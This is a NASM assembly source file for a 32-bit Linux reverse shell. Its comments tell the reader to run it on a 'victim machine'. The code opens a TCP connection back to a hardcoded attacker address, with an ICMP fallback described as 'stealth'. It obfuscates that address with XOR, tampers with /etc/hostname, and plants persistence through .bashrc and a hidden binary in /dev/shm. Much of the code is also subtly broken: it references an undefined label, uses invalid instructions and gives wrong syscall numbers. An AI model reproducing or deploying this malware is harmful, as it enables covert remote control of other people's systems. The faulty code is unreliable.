; Filename: shell.asm
; Author: ByteReaper
; Description: A 32-bit Linux reverse shell in Assembly (NASM syntax)
; Category: Exploit Development / Security Research
;
; Compile:
; nasm -f elf shell.asm -o shell.o
; ld -m elf_i386 shell.o -o shell
;
; Usage:
; Start a listener on the attacker's machine:
; nc -lvnp 50129
;
; Then execute the binary on the victim machine.
;
;----------------------------------------------------

section .data
    encrypted_ip db 0x99, 0xC0, 0xCA, 0xB8, 0x0A, 0x56, 0x5C, 0x88, 0x00  ; Encrypted IP address (reverse shell IP)
    bash_path db "/home/user/.bashrc", 0  ; Path to bashrc file for persistence
    hidden_binary_path db "/dev/shm/.hidden_binary", 0  ; Path to hidden binary for persistence
    hidden_name db "hidden_process_name", 0  ; Name of the hidden process
    len_hidden_name equ $ - hidden_name  ; Length of the hidden process name
    shellcode db 0x90, 0x90, 0x90, 0x90, 0x90  ; Example NOP sled or shellcode
    shellcode_size equ $ - shellcode  ; Size of the shellcode
    

section .text
    global _start  ; Entry point for the program

%define SYS_SOCKETCALL  0x66  ; System call for socket operations
%define SYS_SOCKET      0x1   ; System call for creating a socket
%define SYS_CONNECT     0x3   ; System call for connecting to a socket
%define SYS_DUP2        0x3f  ; System call for duplicating file descriptors (for redirecting I/O)
%define SYS_EXECVE      0x0b  ; System call for executing a new program (e.g., /bin/sh)
%define SYS_EXIT        0x01  ; System call for exiting the process
%define SYS_OPEN        0x5   ; System call for opening a file
%define SYS_WRITE       0x4   ; System call for writing to a file descriptor
%define SYS_READ        0x3   ; System call for reading from a file descriptor
%define SYS_UNLINK      0x10  ; System call for unlinking (deleting) a file
%define SYS_FCNTL       0x3f  ; System call for file control operations
%define SYS_CHMOD       0x0f  ; System call for changing file permissions
%define SOCK_RAW        0x3   ; Type of socket for raw protocol (ICMP)
%define ICMP_PROTO      0x1   ; ICMP protocol number
%define SYS_SENDTO      0x9   ; System call for sending data to a socket
%define SYS_RECVFROM    0x2f  ; System call for receiving data from a socket
%define AF_INET         0x2   ; Address family for IPv4
%define SOCK_STREAM     0x1   ; Type of socket for TCP
%define HTON_IP_ADDR    0xC0A85C80  ; Hardcoded IP address in network byte order (e.g., 192.168.92.128)
%define HTON_PORT_NO    0xC511       ; Hardcoded port number in network byte order (e.g., 50129)
%define O_RDWR          0x02  ; Open file for read/write
%define O_CREAT         0x42  ; Create a new file
%define O_APPEND        0x00400  ; Open file for appending data
%define S_IRWXU         0700  ; User read, write, and execute permissions

_start:
    ; Open the /etc/hostname file to modify it (hidden process name)
    mov eax, SYS_OPEN
    lea ebx, [comm_path]       ; Path to the target file (e.g., "/etc/hostname")
    mov ecx, O_RDWR            ; Open the file in read/write mode
    mov edx, 0                 ; No special flags
    int 0x80                   ; Make the system call
    test eax, eax              ; Check if the system call was successful
    js exit                    ; If error, exit

    mov ebx, eax               ; Save the file descriptor

    ; Write the hidden process name to the file
    mov eax, SYS_WRITE
    lea ecx, [hidden_name]     ; Load the hidden process name
    mov edx, len_hidden_name   ; Length of the hidden name
    int 0x80                   ; Make the system call

    ; Now, create a socket for the reverse shell
    xor eax, eax
    mov al, SYS_SOCKETCALL
    mov bl, SYS_SOCKET
    push dword 0               ; Protocol (0 = IP)
    push dword SOCK_STREAM     ; TCP socket type
    push dword AF_INET         ; IPv4 address family
    mov ecx, esp              ; Address of the parameters
    int 0x80                   ; Make the system call
    test eax, eax              ; Test the result
    js switch_icmp             ; If error, switch to ICMP shell (for stealth mode)
    mov esi, eax               ; Save the socket file descriptor
    call generate_key          ; Generate a random key for decryption
    lea esi, [encrypted_ip]    ; Load the encrypted IP address
    call decrypt_xor           ; Decrypt the IP address
    ; Setup the connection to the attacker's machine
    push dword HTON_IP_ADDR    ; Push the attacker's IP address
    push word HTON_PORT_NO     ; Push the port number
    push word AF_INET          ; Push the address family
    mov ecx, esp              ; Load the address of the connection structure
    mov al, SYS_SOCKETCALL
    mov bl, SYS_CONNECT
    push dword 16             ; Length of the sockaddr_in structure
    push ecx                  ; Address of the sockaddr_in structure
    push esi                  ; Socket file descriptor
    mov ecx, esp              ; Load the address of the parameters
    int 0x80                   ; Make the system call
    test eax, eax              ; Test the result
    js exit                    ; If error, exit
    xor ecx, ecx               ; Clear ECX 
switch_icmp:
    ; ICMP reverse shell ;if the TCP socket failed;
    xor eax, eax
    mov al, SYS_SOCKETCALL
    mov bl, SYS_SOCKET
    push dword ICMP_PROTO      ; Set the protocol to ICMP
    push dword SOCK_RAW        ; Use raw socket type for ICMP
    push dword AF_INET         ; IPv4 address family
    mov ecx, esp              ; Load the parameters
    int 0x80                   ; Make the system call
    test eax, eax              ; Test the result
    js exit                    ; If error, exit
    mov esi, eax               ; Save the socket file descriptor
    call generate_key          ; Generate a random key for decryption
    lea esi, [encrypted_ip]    ; Load the encrypted IP
    call decrypt_xor           ; Decrypt the IP address
    call send_icmp_request     ; Send the ICMP request
    call icmp_reply            ; Wait for ICMP reply
    call execute_command_icmp  ; Execute shell over ICMP
send_icmp_request:
    xor eax, eax
    mov al, SYS_SOCKETCALL
    mov bl, SYS_SENDTO
    push dword 0               ; Destination address (use the socket descriptor)
    push dword esp             ; Message to send
    push dword 8               ; Length of the message
    push dword esi             ; Source IP address
    mov ecx, esp              ; Load the parameters
    int 0x80                   ; Make the system call
    ret
icmp_reply:
    xor eax, eax
    mov al, SYS_RECVFROM
    push dword 1024            ; Buffer size
    push dword esp             ; Buffer address
    push dword esi             ; Socket descriptor
    mov ecx, esp              ; Load the parameters
    int 0x80                   ; Make the system call
    test eax, eax              ; Test the result
    js exit                    ; If error, exit
    ret
dup_loop:
    mov al, SYS_DUP2
    mov ebx, esi               ; Socket file descriptor
    mov ecx, 0
dup_next:
    int 0x80                   ; Duplicate the file descriptor
    inc ecx
    cmp ecx, 3                 ; Check if we've done it three times (stdin, stdout, stderr)
    jne dup_next
    ; Execute the shell
    xor eax, eax
    push eax                   ; Null terminate the string
    push dword 0x68732f6e      ; "/bin/sh" in reverse
    push dword 0x69622f2f      ; "//sh" in reverse
    mov ebx, esp               ; Load the address of "/bin/sh"
    push eax                   ; Null terminate the string
    mov edx, esp               ; Load the address of the null byte
    push ebx                   ; Load the address of "/bin/sh"
    mov ecx, esp               ; Load the address of the parameters
    mov al, SYS_EXECVE         ; System call to execute the shell
    int 0x80                   ; Make the system call
execute_command_icmp:
    ; Execute a shell using ICMP
    xor eax, eax
    push eax                   ; Null terminate the string
    push dword 0x68732f6e      ; "/bin/sh" in reverse
    push dword 0x69622f2f      ; "//sh" in reverse
    mov ebx, esp               ; Load the address of "/bin/sh"
    push eax                   ; Null terminate the string
    mov edx, esp               ; Load the address of the null byte
    push ebx                   ; Load the address of "/bin/sh"
    mov ecx, esp               ; Load the address of the parameters
    mov al, SYS_EXECVE         ; System call to execute the shell
    int 0x80                   ; Make the system call

decrypt_xor:
    ; Decrypt the IP address using XOR
    xor al, al                 ; Clear the AL register
    mov al, [esi]              ; Load the next byte of the encrypted IP
    xor al, ebx                ; XOR the byte with the key
    mov [esi], al              ; Store the decrypted byte back
    inc esi                    ; Move to the next byte
    cmp byte [esi], 0          ; Check if we've reached the null terminator
    jne decrypt_xor            ; If not, continue decrypting
    ret
generate_key: 
    ; Generate a key using the RDTSC instruction
    rdtsc                       ; Read the time stamp counter (RDTSC)
    xor eax, edx                ; XOR the high and low parts of the timestamp to generate a key
    
create_persistence:
    ; Create persistence by adding a command to .bashrc to execute the hidden binary on login
    mov eax, SYS_OPEN
    lea ebx, [bash_path]        ; Path to the bashrc file
    mov ecx, O_RDWR | O_CREAT | O_APPEND  ; Open file in read/write mode and append
    mov edx, S_IRWXU            ; File permissions (user read, write, and execute)
    int 0x80                    ; Make the system call
    test eax, eax               ; Check if the system call was successful
    js exit                     ; If error, exit
    mov ebx, eax                ; Save the file descriptor
    mov eax, SYS_WRITE          ; Prepare to write to the file
    lea ecx, [hidden_binary_path]  ; Path to the hidden binary
    mov edx, 20                 ; Length of the path
    int 0x80                    ; Make the system call
    ret
create_hidden_binary:
    ; Create the hidden binary in /dev/shm
    mov eax, SYS_OPEN
    lea ebx, [hidden_binary_path]   ; Path to the hidden binary
    mov ecx, O_RDWR | O_CREAT | O_APPEND  ; Open file in read/write mode and append
    mov edx, S_IRWXU            ; File permissions (user read, write, and execute)
    int 0x80                    ; Make the system call
    test eax, eax               ; Check if the system call was successful
    js exit                     ; If error, exit
    mov ebx, eax                ; Save the file descriptor
    mov eax, SYS_WRITE          ; Prepare to write the shellcode
    lea ecx, [shellcode]        ; Load the shellcode
    mov edx, shellcode_size     ; Size of the shellcode
    int 0x80                    ; Make the system call
    ret
exit:
    ; Exit the program
    mov al, SYS_EXIT
    xor ebx, ebx                ; Exit status 0 (successful exit)
    int 0x80                    ; Make the system call to exit
   







